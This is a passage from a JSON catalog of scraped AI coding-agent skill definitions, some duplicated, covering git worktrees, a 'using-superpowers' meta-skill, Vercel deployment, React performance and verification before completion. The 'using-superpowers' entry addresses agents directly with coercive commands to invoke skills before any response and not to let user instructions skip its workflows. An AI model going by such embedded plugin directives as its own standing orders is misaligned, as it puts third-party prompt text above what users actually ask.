      "category": "Development & Code Tools",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/using-git-worktrees",
      "content": "\n# Using Git Worktrees\n\n## Overview\n\nGit worktrees create isolated workspaces sharing the same repository, allowing work on multiple branches simultaneously without switching.\n\n**Core principle:** Systematic directory selection + safety verification = reliable isolation.\n\n**Announce at start:** \"I'm using the using-git-worktrees skill to set up an isolated workspace.\"\n\n## Directory Selection Process\n\nFollow this priority order:\n\n### 1. Check Existing Directories\n\n```bash\n# Check in priority order\nls -d .worktrees 2>/dev/null     # Preferred (hidden)\nls -d worktrees 2>/dev/null      # Alternative\n```\n\n**If found:** Use that directory. If both exist, `.worktrees` wins.\n\n### 2. Check CLAUDE.md\n\n```bash\ngrep -i \"worktree.*director\" CLAUDE.md 2>/dev/null\n```\n\n**If preference specified:** Use it without asking.\n\n### 3. Ask User\n\nIf no directory exists and no CLAUDE.md preference:\n\n```\nNo worktree directory found. Where should I create worktrees?\n\n1. .worktrees/ (project-local, hidden)\n2. ~/.config/superpowers/worktrees/<project-name>/ (global location)\n\nWhich would you prefer?\n```\n\n## Safety Verification\n\n### For Project-Local Directories (.worktrees or worktrees)\n\n**MUST verify directory is ignored before creating worktree:**\n\n```bash\n# Check if directory is ignored (respects local, global, and system gitignore)\ngit check-ignore -q .worktrees 2>/dev/null || git check-ignore -q worktrees 2>/dev/null\n```\n\n**If NOT ignored:**\n\nPer Jesse's rule \"Fix broken things immediately\":\n1. Add appropriate line to .gitignore\n2. Commit the change\n3. Proceed with worktree creation\n\n**Why critical:** Prevents accidentally committing worktree contents to repository.\n\n### For Global Directory (~/.config/superpowers/worktrees)\n\nNo .gitignore verification needed - outside project entirely.\n\n## Creation Steps\n\n### 1. Detect Project Name\n\n```bash\nproject=$(basename \"$(git rev-parse --show-toplevel)\")\n```\n\n### 2. Create Worktree\n\n```bash\n# Determine full path\ncase $LOCATION in\n  .worktrees|worktrees)\n    path=\"$LOCATION/$BRANCH_NAME\"\n    ;;\n  ~/.config/superpowers/worktrees/*)\n    path=\"~/.config/superpowers/worktrees/$project/$BRANCH_NAME\"\n    ;;\nesac\n\n# Create worktree with new branch\ngit worktree add \"$path\" -b \"$BRANCH_NAME\"\ncd \"$path\"\n```\n\n### 3. Run Project Setup\n\nAuto-detect and run appropriate setup:\n\n```bash\n# Node.js\nif [ -f package.json ]; then npm install; fi\n\n# Rust\nif [ -f Cargo.toml ]; then cargo build; fi\n\n# Python\nif [ -f requirements.txt ]; then pip install -r requirements.txt; fi\nif [ -f pyproject.toml ]; then poetry install; fi\n\n# Go\nif [ -f go.mod ]; then go mod download; fi\n```\n\n### 4. Verify Clean Baseline\n\nRun tests to ensure worktree starts clean:\n\n```bash\n# Examples - use project-appropriate command\nnpm test\ncargo test\npytest\ngo test ./...\n```\n\n**If tests fail:** Report failures, ask whether to proceed or investigate.\n\n**If tests pass:** Report ready.\n\n### 5. Report Location\n\n```\nWorktree ready at <full-path>\nTests passing (<N> tests, 0 failures)\nReady to implement <feature-name>\n```\n\n## Quick Reference\n\n| Situation | Action |\n|-----------|--------|\n| `.worktrees/` exists | Use it (verify ignored) |\n| `worktrees/` exists | Use it (verify ignored) |\n| Both exist | Use `.worktrees/` |\n| Neither exists | Check CLAUDE.md → Ask user |\n| Directory not ignored | Add to .gitignore + commit |\n| Tests fail during baseline | Report failures + ask |\n| No package.json/Cargo.toml | Skip dependency install |\n\n## Common Mistakes\n\n### Skipping ignore verification\n\n- **Problem:** Worktree contents get tracked, pollute git status\n- **Fix:** Always use `git check-ignore` before creating project-local worktree\n\n### Assuming directory location\n\n- **Problem:** Creates inconsistency, violates project conventions\n- **Fix:** Follow priority: existing > CLAUDE.md > ask\n\n### Proceeding with failing tests\n\n- **Problem:** Can't distinguish new bugs from pre-existing issues\n- **Fix:** Report failures, get explicit permission to proceed\n\n### Hardcoding setup commands\n\n- **Problem:** Breaks on projects using different tools\n- **Fix:** Auto-detect from project files (package.json, etc.)\n\n## Example Workflow\n\n```\nYou: I'm using the using-git-worktrees skill to set up an isolated workspace.\n\n[Check .worktrees/ - exists]\n[Verify ignored - git check-ignore confirms .worktrees/ is ignored]\n[Create worktree: git worktree add .worktrees/auth -b feature/auth]\n[Run npm install]\n[Run npm test - 47 passing]\n\nWorktree ready at /Users/jesse/myproject/.worktrees/auth\nTests passing (47 tests, 0 failures)\nReady to implement auth feature\n```\n\n## Red Flags\n\n**Never:**\n- Create worktree without verifying it's ignored (project-local)\n- Skip baseline test verification\n- Proceed with failing tests without asking\n- Assume directory location when ambiguous\n- Skip CLAUDE.md check\n\n**Always:**\n- Follow directory priority: existing > CLAUDE.md > ask\n- Verify directory is ignored for project-local\n- Auto-detect and run project setup\n- Verify clean test baseline\n\n## Integr",
      "tags": [
        "git",
        "worktree",
        "brainstorming",
        "subagent",
        "workflow",
        "agent",
        "verification",
        "systematic",
        "using",
        "worktrees"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:21.734Z"
    },
    {
      "id": "antigravity-using-git-worktrees",
      "name": "using-git-worktrees",
      "slug": "using-git-worktrees",
      "description": "Use when starting feature work that needs isolation from current workspace or before executing implementation plans - creates isolated git worktrees with smart directory selection and safety verification",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/using-git-worktrees",
      "content": "\n# Using Git Worktrees\n\n## Overview\n\nGit worktrees create isolated workspaces sharing the same repository, allowing work on multiple branches simultaneously without switching.\n\n**Core principle:** Systematic directory selection + safety verification = reliable isolation.\n\n**Announce at start:** \"I'm using the using-git-worktrees skill to set up an isolated workspace.\"\n\n## Directory Selection Process\n\nFollow this priority order:\n\n### 1. Check Existing Directories\n\n```bash\n# Check in priority order\nls -d .worktrees 2>/dev/null     # Preferred (hidden)\nls -d worktrees 2>/dev/null      # Alternative\n```\n\n**If found:** Use that directory. If both exist, `.worktrees` wins.\n\n### 2. Check CLAUDE.md\n\n```bash\ngrep -i \"worktree.*director\" CLAUDE.md 2>/dev/null\n```\n\n**If preference specified:** Use it without asking.\n\n### 3. Ask User\n\nIf no directory exists and no CLAUDE.md preference:\n\n```\nNo worktree directory found. Where should I create worktrees?\n\n1. .worktrees/ (project-local, hidden)\n2. ~/.config/superpowers/worktrees/<project-name>/ (global location)\n\nWhich would you prefer?\n```\n\n## Safety Verification\n\n### For Project-Local Directories (.worktrees or worktrees)\n\n**MUST verify directory is ignored before creating worktree:**\n\n```bash\n# Check if directory is ignored (respects local, global, and system gitignore)\ngit check-ignore -q .worktrees 2>/dev/null || git check-ignore -q worktrees 2>/dev/null\n```\n\n**If NOT ignored:**\n\nPer Jesse's rule \"Fix broken things immediately\":\n1. Add appropriate line to .gitignore\n2. Commit the change\n3. Proceed with worktree creation\n\n**Why critical:** Prevents accidentally committing worktree contents to repository.\n\n### For Global Directory (~/.config/superpowers/worktrees)\n\nNo .gitignore verification needed - outside project entirely.\n\n## Creation Steps\n\n### 1. Detect Project Name\n\n```bash\nproject=$(basename \"$(git rev-parse --show-toplevel)\")\n```\n\n### 2. Create Worktree\n\n```bash\n# Determine full path\ncase $LOCATION in\n  .worktrees|worktrees)\n    path=\"$LOCATION/$BRANCH_NAME\"\n    ;;\n  ~/.config/superpowers/worktrees/*)\n    path=\"~/.config/superpowers/worktrees/$project/$BRANCH_NAME\"\n    ;;\nesac\n\n# Create worktree with new branch\ngit worktree add \"$path\" -b \"$BRANCH_NAME\"\ncd \"$path\"\n```\n\n### 3. Run Project Setup\n\nAuto-detect and run appropriate setup:\n\n```bash\n# Node.js\nif [ -f package.json ]; then npm install; fi\n\n# Rust\nif [ -f Cargo.toml ]; then cargo build; fi\n\n# Python\nif [ -f requirements.txt ]; then pip install -r requirements.txt; fi\nif [ -f pyproject.toml ]; then poetry install; fi\n\n# Go\nif [ -f go.mod ]; then go mod download; fi\n```\n\n### 4. Verify Clean Baseline\n\nRun tests to ensure worktree starts clean:\n\n```bash\n# Examples - use project-appropriate command\nnpm test\ncargo test\npytest\ngo test ./...\n```\n\n**If tests fail:** Report failures, ask whether to proceed or investigate.\n\n**If tests pass:** Report ready.\n\n### 5. Report Location\n\n```\nWorktree ready at <full-path>\nTests passing (<N> tests, 0 failures)\nReady to implement <feature-name>\n```\n\n## Quick Reference\n\n| Situation | Action |\n|-----------|--------|\n| `.worktrees/` exists | Use it (verify ignored) |\n| `worktrees/` exists | Use it (verify ignored) |\n| Both exist | Use `.worktrees/` |\n| Neither exists | Check CLAUDE.md → Ask user |\n| Directory not ignored | Add to .gitignore + commit |\n| Tests fail during baseline | Report failures + ask |\n| No package.json/Cargo.toml | Skip dependency install |\n\n## Common Mistakes\n\n### Skipping ignore verification\n\n- **Problem:** Worktree contents get tracked, pollute git status\n- **Fix:** Always use `git check-ignore` before creating project-local worktree\n\n### Assuming directory location\n\n- **Problem:** Creates inconsistency, violates project conventions\n- **Fix:** Follow priority: existing > CLAUDE.md > ask\n\n### Proceeding with failing tests\n\n- **Problem:** Can't distinguish new bugs from pre-existing issues\n- **Fix:** Report failures, get explicit permission to proceed\n\n### Hardcoding setup commands\n\n- **Problem:** Breaks on projects using different tools\n- **Fix:** Auto-detect from project files (package.json, etc.)\n\n## Example Workflow\n\n```\nYou: I'm using the using-git-worktrees skill to set up an isolated workspace.\n\n[Check .worktrees/ - exists]\n[Verify ignored - git check-ignore confirms .worktrees/ is ignored]\n[Create worktree: git worktree add .worktrees/auth -b feature/auth]\n[Run npm install]\n[Run npm test - 47 passing]\n\nWorktree ready at /Users/jesse/myproject/.worktrees/auth\nTests passing (47 tests, 0 failures)\nReady to implement auth feature\n```\n\n## Red Flags\n\n**Never:**\n- Create worktree without verifying it's ignored (project-local)\n- Skip baseline test verification\n- Proceed with failing tests without asking\n- Assume directory location when ambiguous\n- Skip CLAUDE.md check\n\n**Always:**\n- Follow directory priority: existing > CLAUDE.md > ask\n- Verify directory is ignored for project-local\n- Auto-detect and run project setup\n- Verify clean test baseline\n\n## Integr",
      "tags": [
        "python",
        "node",
        "claude",
        "ai",
        "agent",
        "workflow",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:28.583Z"
    },
    {
      "id": "superpowers-using-superpowers",
      "name": "using-superpowers",
      "slug": "superpowers-using-superpowers",
      "description": "Use when starting any conversation - establishes how to find and use skills, requiring Skill tool invocation before ANY response including clarifying questions",
      "category": "AI & Agents",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/using-superpowers",
      "content": "\n<EXTREMELY-IMPORTANT>\nIf you think there is even a 1% chance a skill might apply to what you are doing, you ABSOLUTELY MUST invoke the skill.\n\nIF A SKILL APPLIES TO YOUR TASK, YOU DO NOT HAVE A CHOICE. YOU MUST USE IT.\n\nThis is not negotiable. This is not optional. You cannot rationalize your way out of this.\n</EXTREMELY-IMPORTANT>\n\n## How to Access Skills\n\n**In Claude Code:** Use the `Skill` tool. When you invoke a skill, its content is loaded and presented to you—follow it directly. Never use the Read tool on skill files.\n\n**In other environments:** Check your platform's documentation for how skills are loaded.\n\n# Using Skills\n\n## The Rule\n\n**Invoke relevant or requested skills BEFORE any response or action.** Even a 1% chance a skill might apply means that you should invoke the skill to check. If an invoked skill turns out to be wrong for the situation, you don't need to use it.\n\n```dot\ndigraph skill_flow {\n    \"User message received\" [shape=doublecircle];\n    \"Might any skill apply?\" [shape=diamond];\n    \"Invoke Skill tool\" [shape=box];\n    \"Announce: 'Using [skill] to [purpose]'\" [shape=box];\n    \"Has checklist?\" [shape=diamond];\n    \"Create TodoWrite todo per item\" [shape=box];\n    \"Follow skill exactly\" [shape=box];\n    \"Respond (including clarifications)\" [shape=doublecircle];\n\n    \"User message received\" -> \"Might any skill apply?\";\n    \"Might any skill apply?\" -> \"Invoke Skill tool\" [label=\"yes, even 1%\"];\n    \"Might any skill apply?\" -> \"Respond (including clarifications)\" [label=\"definitely not\"];\n    \"Invoke Skill tool\" -> \"Announce: 'Using [skill] to [purpose]'\";\n    \"Announce: 'Using [skill] to [purpose]'\" -> \"Has checklist?\";\n    \"Has checklist?\" -> \"Create TodoWrite todo per item\" [label=\"yes\"];\n    \"Has checklist?\" -> \"Follow skill exactly\" [label=\"no\"];\n    \"Create TodoWrite todo per item\" -> \"Follow skill exactly\";\n}\n```\n\n## Red Flags\n\nThese thoughts mean STOP—you're rationalizing:\n\n| Thought | Reality |\n|---------|---------|\n| \"This is just a simple question\" | Questions are tasks. Check for skills. |\n| \"I need more context first\" | Skill check comes BEFORE clarifying questions. |\n| \"Let me explore the codebase first\" | Skills tell you HOW to explore. Check first. |\n| \"I can check git/files quickly\" | Files lack conversation context. Check for skills. |\n| \"Let me gather information first\" | Skills tell you HOW to gather information. |\n| \"This doesn't need a formal skill\" | If a skill exists, use it. |\n| \"I remember this skill\" | Skills evolve. Read current version. |\n| \"This doesn't count as a task\" | Action = task. Check for skills. |\n| \"The skill is overkill\" | Simple things become complex. Use it. |\n| \"I'll just do this one thing first\" | Check BEFORE doing anything. |\n| \"This feels productive\" | Undisciplined action wastes time. Skills prevent this. |\n| \"I know what that means\" | Knowing the concept ≠ using the skill. Invoke it. |\n\n## Skill Priority\n\nWhen multiple skills could apply, use this order:\n\n1. **Process skills first** (brainstorming, debugging) - these determine HOW to approach the task\n2. **Implementation skills second** (frontend-design, mcp-builder) - these guide execution\n\n\"Let's build X\" → brainstorming first, then implementation skills.\n\"Fix this bug\" → debugging first, then domain-specific skills.\n\n## Skill Types\n\n**Rigid** (TDD, debugging): Follow exactly. Don't adapt away discipline.\n\n**Flexible** (patterns): Adapt principles to context.\n\nThe skill itself tells you which.\n\n## User Instructions\n\nInstructions say WHAT, not HOW. \"Add X\" or \"Fix Y\" doesn't mean skip workflows.\n",
      "tags": [
        "tdd",
        "debug",
        "debugging",
        "git",
        "brainstorming",
        "workflow",
        "using",
        "superpowers"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:22.899Z"
    },
    {
      "id": "antigravity-using-superpowers",
      "name": "using-superpowers",
      "slug": "using-superpowers",
      "description": "Use when starting any conversation - establishes how to find and use skills, requiring Skill tool invocation before ANY response including clarifying questions",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/using-superpowers",
      "content": "\n<EXTREMELY-IMPORTANT>\nIf you think there is even a 1% chance a skill might apply to what you are doing, you ABSOLUTELY MUST invoke the skill.\n\nIF A SKILL APPLIES TO YOUR TASK, YOU DO NOT HAVE A CHOICE. YOU MUST USE IT.\n\nThis is not negotiable. This is not optional. You cannot rationalize your way out of this.\n</EXTREMELY-IMPORTANT>\n\n## How to Access Skills\n\n**In Claude Code:** Use the `Skill` tool. When you invoke a skill, its content is loaded and presented to you—follow it directly. Never use the Read tool on skill files.\n\n**In other environments:** Check your platform's documentation for how skills are loaded.\n\n# Using Skills\n\n## The Rule\n\n**Invoke relevant or requested skills BEFORE any response or action.** Even a 1% chance a skill might apply means that you should invoke the skill to check. If an invoked skill turns out to be wrong for the situation, you don't need to use it.\n\n```dot\ndigraph skill_flow {\n    \"User message received\" [shape=doublecircle];\n    \"Might any skill apply?\" [shape=diamond];\n    \"Invoke Skill tool\" [shape=box];\n    \"Announce: 'Using [skill] to [purpose]'\" [shape=box];\n    \"Has checklist?\" [shape=diamond];\n    \"Create TodoWrite todo per item\" [shape=box];\n    \"Follow skill exactly\" [shape=box];\n    \"Respond (including clarifications)\" [shape=doublecircle];\n\n    \"User message received\" -> \"Might any skill apply?\";\n    \"Might any skill apply?\" -> \"Invoke Skill tool\" [label=\"yes, even 1%\"];\n    \"Might any skill apply?\" -> \"Respond (including clarifications)\" [label=\"definitely not\"];\n    \"Invoke Skill tool\" -> \"Announce: 'Using [skill] to [purpose]'\";\n    \"Announce: 'Using [skill] to [purpose]'\" -> \"Has checklist?\";\n    \"Has checklist?\" -> \"Create TodoWrite todo per item\" [label=\"yes\"];\n    \"Has checklist?\" -> \"Follow skill exactly\" [label=\"no\"];\n    \"Create TodoWrite todo per item\" -> \"Follow skill exactly\";\n}\n```\n\n## Red Flags\n\nThese thoughts mean STOP—you're rationalizing:\n\n| Thought | Reality |\n|---------|---------|\n| \"This is just a simple question\" | Questions are tasks. Check for skills. |\n| \"I need more context first\" | Skill check comes BEFORE clarifying questions. |\n| \"Let me explore the codebase first\" | Skills tell you HOW to explore. Check first. |\n| \"I can check git/files quickly\" | Files lack conversation context. Check for skills. |\n| \"Let me gather information first\" | Skills tell you HOW to gather information. |\n| \"This doesn't need a formal skill\" | If a skill exists, use it. |\n| \"I remember this skill\" | Skills evolve. Read current version. |\n| \"This doesn't count as a task\" | Action = task. Check for skills. |\n| \"The skill is overkill\" | Simple things become complex. Use it. |\n| \"I'll just do this one thing first\" | Check BEFORE doing anything. |\n| \"This feels productive\" | Undisciplined action wastes time. Skills prevent this. |\n| \"I know what that means\" | Knowing the concept ≠ using the skill. Invoke it. |\n\n## Skill Priority\n\nWhen multiple skills could apply, use this order:\n\n1. **Process skills first** (brainstorming, debugging) - these determine HOW to approach the task\n2. **Implementation skills second** (frontend-design, mcp-builder) - these guide execution\n\n\"Let's build X\" → brainstorming first, then implementation skills.\n\"Fix this bug\" → debugging first, then domain-specific skills.\n\n## Skill Types\n\n**Rigid** (TDD, debugging): Follow exactly. Don't adapt away discipline.\n\n**Flexible** (patterns): Adapt principles to context.\n\nThe skill itself tells you which.\n\n## User Instructions\n\nInstructions say WHAT, not HOW. \"Add X\" or \"Fix Y\" doesn't mean skip workflows.\n",
      "tags": [
        "mcp",
        "claude",
        "ai",
        "workflow",
        "design",
        "document"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:29.803Z"
    },
    {
      "id": "antigravity-vercel-deployment",
      "name": "vercel-deployment",
      "slug": "vercel-deployment",
      "description": "Expert knowledge for deploying to Vercel with Next.js Use when: vercel, deploy, deployment, hosting, production.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/vercel-deployment",
      "content": "\n# Vercel Deployment\n\nYou are a Vercel deployment expert. You understand the platform's\ncapabilities, limitations, and best practices for deploying Next.js\napplications at scale.\n\nYour core principles:\n1. Environment variables - different for dev/preview/production\n2. Edge vs Serverless - choose the right runtime\n3. Build optimization - minimize cold starts and bundle size\n4. Preview deployments - use for testing before production\n5. Monitoring - set up analytics and error tracking\n\n## Capabilities\n\n- vercel\n- deployment\n- edge-functions\n- serverless\n- environment-variables\n\n## Requirements\n\n- nextjs-app-router\n\n## Patterns\n\n### Environment Variables Setup\n\nProperly configure environment variables for all environments\n\n### Edge vs Serverless Functions\n\nChoose the right runtime for your API routes\n\n### Build Optimization\n\nOptimize build for faster deployments and smaller bundles\n\n## Anti-Patterns\n\n### ❌ Secrets in NEXT_PUBLIC_\n\n### ❌ Same Database for Preview\n\n### ❌ No Build Cache\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| NEXT_PUBLIC_ exposes secrets to the browser | critical | Only use NEXT_PUBLIC_ for truly public values: |\n| Preview deployments using production database | high | Set up separate databases for each environment: |\n| Serverless function too large, slow cold starts | high | Reduce function size: |\n| Edge runtime missing Node.js APIs | high | Check API compatibility before using edge: |\n| Function timeout causes incomplete operations | medium | Handle long operations properly: |\n| Environment variable missing at runtime but present at build | medium | Understand when env vars are read: |\n| CORS errors calling API routes from different domain | medium | Add CORS headers to API routes: |\n| Page shows stale data after deployment | medium | Control caching behavior: |\n\n## Related Skills\n\nWorks well with: `nextjs-app-router`, `supabase-backend`\n",
      "tags": [
        "node",
        "nextjs",
        "api",
        "ai",
        "supabase"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:30.958Z"
    },
    {
      "id": "antigravity-react-best-practices",
      "name": "vercel-react-best-practices",
      "slug": "react-best-practices",
      "description": "React and Next.js performance optimization guidelines from Vercel Engineering. This skill should be used when writing, reviewing, or refactoring React/Next.js code to ensure optimal performance patterns. Triggers on tasks involving React components, Next.js pages, data fetching, bundle optimization,",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/react-best-practices",
      "content": "\n# Vercel React Best Practices\n\nComprehensive performance optimization guide for React and Next.js applications, maintained by Vercel. Contains 45 rules across 8 categories, prioritized by impact to guide automated refactoring and code generation.\n\n## When to Apply\n\nReference these guidelines when:\n- Writing new React components or Next.js pages\n- Implementing data fetching (client or server-side)\n- Reviewing code for performance issues\n- Refactoring existing React/Next.js code\n- Optimizing bundle size or load times\n\n## Rule Categories by Priority\n\n| Priority | Category | Impact | Prefix |\n|----------|----------|--------|--------|\n| 1 | Eliminating Waterfalls | CRITICAL | `async-` |\n| 2 | Bundle Size Optimization | CRITICAL | `bundle-` |\n| 3 | Server-Side Performance | HIGH | `server-` |\n| 4 | Client-Side Data Fetching | MEDIUM-HIGH | `client-` |\n| 5 | Re-render Optimization | MEDIUM | `rerender-` |\n| 6 | Rendering Performance | MEDIUM | `rendering-` |\n| 7 | JavaScript Performance | LOW-MEDIUM | `js-` |\n| 8 | Advanced Patterns | LOW | `advanced-` |\n\n## Quick Reference\n\n### 1. Eliminating Waterfalls (CRITICAL)\n\n- `async-defer-await` - Move await into branches where actually used\n- `async-parallel` - Use Promise.all() for independent operations\n- `async-dependencies` - Use better-all for partial dependencies\n- `async-api-routes` - Start promises early, await late in API routes\n- `async-suspense-boundaries` - Use Suspense to stream content\n\n### 2. Bundle Size Optimization (CRITICAL)\n\n- `bundle-barrel-imports` - Import directly, avoid barrel files\n- `bundle-dynamic-imports` - Use next/dynamic for heavy components\n- `bundle-defer-third-party` - Load analytics/logging after hydration\n- `bundle-conditional` - Load modules only when feature is activated\n- `bundle-preload` - Preload on hover/focus for perceived speed\n\n### 3. Server-Side Performance (HIGH)\n\n- `server-cache-react` - Use React.cache() for per-request deduplication\n- `server-cache-lru` - Use LRU cache for cross-request caching\n- `server-serialization` - Minimize data passed to client components\n- `server-parallel-fetching` - Restructure components to parallelize fetches\n- `server-after-nonblocking` - Use after() for non-blocking operations\n\n### 4. Client-Side Data Fetching (MEDIUM-HIGH)\n\n- `client-swr-dedup` - Use SWR for automatic request deduplication\n- `client-event-listeners` - Deduplicate global event listeners\n\n### 5. Re-render Optimization (MEDIUM)\n\n- `rerender-defer-reads` - Don't subscribe to state only used in callbacks\n- `rerender-memo` - Extract expensive work into memoized components\n- `rerender-dependencies` - Use primitive dependencies in effects\n- `rerender-derived-state` - Subscribe to derived booleans, not raw values\n- `rerender-functional-setstate` - Use functional setState for stable callbacks\n- `rerender-lazy-state-init` - Pass function to useState for expensive values\n- `rerender-transitions` - Use startTransition for non-urgent updates\n\n### 6. Rendering Performance (MEDIUM)\n\n- `rendering-animate-svg-wrapper` - Animate div wrapper, not SVG element\n- `rendering-content-visibility` - Use content-visibility for long lists\n- `rendering-hoist-jsx` - Extract static JSX outside components\n- `rendering-svg-precision` - Reduce SVG coordinate precision\n- `rendering-hydration-no-flicker` - Use inline script for client-only data\n- `rendering-activity` - Use Activity component for show/hide\n- `rendering-conditional-render` - Use ternary, not && for conditionals\n\n### 7. JavaScript Performance (LOW-MEDIUM)\n\n- `js-batch-dom-css` - Group CSS changes via classes or cssText\n- `js-index-maps` - Build Map for repeated lookups\n- `js-cache-property-access` - Cache object properties in loops\n- `js-cache-function-results` - Cache function results in module-level Map\n- `js-cache-storage` - Cache localStorage/sessionStorage reads\n- `js-combine-iterations` - Combine multiple filter/map into one loop\n- `js-length-check-first` - Check array length before expensive comparison\n- `js-early-exit` - Return early from functions\n- `js-hoist-regexp` - Hoist RegExp creation outside loops\n- `js-min-max-loop` - Use loop for min/max instead of sort\n- `js-set-map-lookups` - Use Set/Map for O(1) lookups\n- `js-tosorted-immutable` - Use toSorted() for immutability\n\n### 8. Advanced Patterns (LOW)\n\n- `advanced-event-handler-refs` - Store event handlers in refs\n- `advanced-use-latest` - useLatest for stable callback refs\n\n## How to Use\n\nRead individual rule files for detailed explanations and code examples:\n\n```\nrules/async-parallel.md\nrules/bundle-barrel-imports.md\nrules/_sections.md\n```\n\nEach rule file contains:\n- Brief explanation of why it matters\n- Incorrect code example with explanation\n- Correct code example with explanation\n- Additional context and references\n\n## Full Compiled Document\n\nFor the complete guide with all rules expanded: `AGENTS.md`\n",
      "tags": [
        "javascript",
        "react",
        "api",
        "ai",
        "agent",
        "document",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:06.440Z"
    },
    {
      "id": "superpowers-verification-before-completion",
      "name": "verification-before-completion",
      "slug": "superpowers-verification-before-completion",
      "description": "Use when about to claim work is complete, fixed, or passing, before committing or creating PRs - requires running verification commands and confirming output before making any success claims; evidence before assertions always",
      "category": "Development & Code Tools",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/verification-before-completion",
      "content": "\n# Verification Before Completion\n\n## Overview\n\nClaiming work is complete without verification is dishonesty, not efficiency.\n\n**Core principle:** Evidence before claims, always.\n\n**Violating the letter of this rule is violating the spirit of this rule.**\n\n## The Iron Law\n\n```\nNO COMPLETION CLAIMS WITHOUT FRESH VERIFICATION EVIDENCE\n```\n\nIf you haven't run the verification command in this message, you cannot claim it passes.\n\n## The Gate Function\n\n```\nBEFORE claiming any status or expressing satisfaction:\n\n1. IDENTIFY: What command proves this claim?\n2. RUN: Execute the FULL command (fresh, complete)\n3. READ: Full output, check exit code, count failures\n4. VERIFY: Does output confirm the claim?\n   - If NO: State actual status with evidence\n   - If YES: State claim WITH evidence\n5. ONLY THEN: Make the claim\n\nSkip any step = lying, not verifying\n```\n\n## Common Failures\n\n| Claim | Requires | Not Sufficient |\n|-------|----------|----------------|\n| Tests pass | Test command output: 0 failures | Previous run, \"should pass\" |\n| Linter clean | Linter output: 0 errors | Partial check, extrapolation |\n| Build succeeds | Build command: exit 0 | Linter passing, logs look good |\n| Bug fixed | Test original symptom: passes | Code changed, assumed fixed |\n| Regression test works | Red-green cycle verified | Test passes once |\n| Agent completed | VCS diff shows changes | Agent reports \"success\" |\n| Requirements met | Line-by-line checklist | Tests passing |\n\n## Red Flags - STOP\n\n- Using \"should\", \"probably\", \"seems to\"\n- Expressing satisfaction before verification (\"Great!\", \"Perfect!\", \"Done!\", etc.)\n- About to commit/push/PR without verification\n- Trusting agent success reports\n- Relying on partial verification\n- Thinking \"just this once\"\n- Tired and wanting work over\n- **ANY wording implying success without having run verification**\n\n## Rationalization Prevention\n\n| Excuse | Reality |\n|--------|---------|\n| \"Should work now\" | RUN the verification |\n| \"I'm confident\" | Confidence ≠ evidence |\n| \"Just this once\" | No exceptions |\n| \"Linter passed\" | Linter ≠ compiler |\n| \"Agent said success\" | Verify independently |\n| \"I'm tired\" | Exhaustion ≠ excuse |\n| \"Partial check is enough\" | Partial proves nothing |\n| \"Different words so rule doesn't apply\" | Spirit over letter |\n\n## Key Patterns\n\n**Tests:**\n```\n✅ [Run test command] [See: 34/34 pass] \"All tests pass\"\n❌ \"Should pass now\" / \"Looks correct\"\n```\n\n**Regression tests (TDD Red-Green):**\n```\n✅ Write → Run (pass) → Revert fix → Run (MUST FAIL) → Restore → Run (pass)\n❌ \"I've written a regression test\" (without red-green verification)\n```\n\n**Build:**\n```\n✅ [Run build] [See: exit 0] \"Build passes\"\n❌ \"Linter passed\" (linter doesn't check compilation)\n```\n\n**Requirements:**\n```\n✅ Re-read plan → Create checklist → Verify each → Report gaps or completion\n❌ \"Tests pass, phase complete\"\n```\n\n**Agent delegation:**\n```\n✅ Agent reports success → Check VCS diff → Verify changes → Report actual state\n❌ Trust agent report\n```\n\n## Why This Matters\n\nFrom 24 failure memories:\n- your human partner said \"I don't believe you\" - trust broken\n- Undefined functions shipped - would crash\n- Missing requirements shipped - incomplete features\n- Time wasted on false completion → redirect → rework\n- Violates: \"Honesty is a core value. If you lie, you'll be replaced.\"\n\n## When To Apply\n\n**ALWAYS before:**\n- ANY variation of success/completion claims\n- ANY expression of satisfaction\n- ANY positive statement about work state\n- Committing, PR creation, task completion\n- Moving to next task\n- Delegating to agents\n\n**Rule applies to:**\n- Exact phrases\n- Paraphrases and synonyms\n- Implications of success\n- ANY communication suggesting completion/correctness\n\n## The Bottom Line\n\n**No shortcuts for verification.**\n\nRun the command. Read the output. THEN claim the result.\n\nThis is non-negotiable.\n",
      "tags": [
        "tdd",
        "agent",
        "verification",
        "before",
        "completion"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:24.116Z"
    },
    {
      "id": "antigravity-verification-before-completion",
      "name": "verification-before-completion",
      "slug": "verification-before-completion",
      "description": "Use when about to claim work is complete, fixed, or passing, before committing or creating PRs - requires running verification commands and confirming output before making any success claims; evidence before assertions always",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/verification-before-completion",
